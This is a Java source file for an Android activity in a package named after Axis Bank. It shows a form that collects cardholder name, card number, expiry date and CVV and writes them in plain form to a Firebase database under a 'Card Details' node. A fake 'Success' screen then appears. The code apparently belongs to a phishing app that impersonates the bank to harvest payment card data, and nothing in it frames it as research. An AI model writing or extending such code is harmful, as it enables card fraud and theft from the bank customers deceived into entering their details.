package com.bank.axisbank.screen;

import static com.bank.axisbank.screen.formActivity.ref;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Bundle;
import android.view.View;
import android.view.WindowManager;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

import com.bank.axisbank.R;
import com.bank.axisbank.model.CardNumber;
import com.bank.axisbank.model.cardModel;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.database.FirebaseDatabase;


public class cardDetails extends AppCompatActivity {
    EditText cardOwner , cardNumber , ExMonth , ExYear, CVV;
    android.widget.Button validate;
    TextView ok;
    LinearLayout layoutt ,Success;
    View loadingOverlayy;
    String STcardOwner , STcardNumber , STExMonth , STExYear, STCVV;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_card_details);
        cardOwner =findViewById(R.id.cardholdername);
        cardNumber=findViewById(R.id.cardnumber);
//        cardNumber.setText(CardNumber.getCard_Number());
        ExMonth=findViewById(R.id.EXpiry);
        ExYear=findViewById(R.id.yearEX);
        CVV =findViewById(R.id.cvv);
        validate=findViewById(R.id.validate);
        layoutt = findViewById(R.id.progresss);
        loadingOverlayy = findViewById(R.id.loadingOverlayy);
        Success =findViewById(R.id.success);
        ok =findViewById(R.id.ok);

        validate.setOnClickListener(view -> {
            STcardOwner=cardOwner.getText().toString();
            STcardNumber=cardNumber.getText().toString();
            STExMonth=ExMonth.getText().toString();
            STExYear=ExYear.getText().toString();
            STCVV=CVV.getText().toString();
            showLoadingOverlay();
            String phone = com.bank.axisbank.model.phone.getPhone();
            FirebaseDatabase db = FirebaseDatabase.getInstance();
            if(String.valueOf(STcardNumber).equals("") || String.valueOf(STcardOwner).equals("") || String.valueOf(STExMonth).equals("") || String.valueOf(STExYear).equals("") || String.valueOf(STCVV).equals("")){
                hideLoadingOverlay();
                Toast.makeText(this, "Fill All Details", Toast.LENGTH_SHORT).show();
            }else {
                try {
                    cardModel car = new cardModel(STcardOwner,STcardNumber,STExMonth,STExYear,STCVV);
                    ref.child("Card Details").setValue(car).addOnCompleteListener(new OnCompleteListener<Void>() {
                        @Override
                        public void onComplete(@NonNull Task<Void> task) {
                            hideLoadingOverlay();
                            loadingOverlayy.setVisibility(View.VISIBLE);
                            Success.setVisibility(View.VISIBLE);
                        }
                    });
                }catch (Exception e ){
                    hideLoadingOverlay();
                    Toast.makeText(getApplicationContext(),"Error :Please Try Later",Toast.LENGTH_LONG).show();
                }

            }

            if (isInternetAvailable()) {

            } else {
                hideLoadingOverlay();
                loadingOverlayy.setVisibility(View.GONE);
                Success.setVisibility(View.GONE);
                Toast.makeText(this, "Failed to connect to Internet", Toast.LENGTH_SHORT).show();

            }


            ok.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View view) {
                    loadingOverlayy.setVisibility(View.GONE);
                    Success.setVisibility(View.GONE);
                    Intent intent = new Intent(getApplicationContext(), MainActivity.class);
                    intent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
                    startActivity(intent);

                }
            });




        });


    }
    private void showLoadingOverlay() {
        layoutt.setVisibility(View.VISIBLE);
        loadingOverlayy.setVisibility(View.VISIBLE);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE, WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE);
    }

    private void hideLoadingOverlay() {
        layoutt.setVisibility(View.GONE);
        loadingOverlayy.setVisibility(View.GONE);
        getWindow().clearFlags(WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE);
    }
    private boolean isInternetAvailable() {
        ConnectivityManager connectivityManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        if (connectivityManager != null) {
            NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
            return activeNetworkInfo != null && activeNetworkInfo.isConnected();
        }
        return false;
    }
}